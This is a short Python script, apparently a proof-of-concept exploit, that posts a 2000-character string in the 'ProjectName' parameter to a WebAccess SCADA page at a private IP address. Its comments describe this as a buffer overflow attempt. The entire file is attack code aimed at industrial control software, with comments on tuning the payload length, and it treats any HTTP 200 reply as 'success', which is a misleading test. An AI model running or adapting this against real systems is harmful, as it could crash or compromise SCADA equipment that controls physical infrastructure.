import requests

# Target URL for the vulnerable WebAccess SCADA page
url = "http://172.23.32.32/webaccess/bwmain.asp"  # Modify the path if different

# Payload: Overflowing the 'ProjectName' parameter with a large amount of data
# Adjust the length based on testing or past reports. Typically around 1000-2000 characters.
payload = "A" * 2000  # 2000 characters, may adjust based on findings

# Prepare the data to send in the POST request
data = {
    "ProjectName": payload,  # The parameter vulnerable to buffer overflow
}

# Send the request
try:
    response = requests.post(url, data=data, timeout=10)  # Adjust the timeout as needed
    if response.status_code == 200:
        print("[+] Exploit attempt successful: HTTP 200 received")
    else:
        print(f"[-] Unexpected response: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"[!] Error during exploit attempt: {e}")
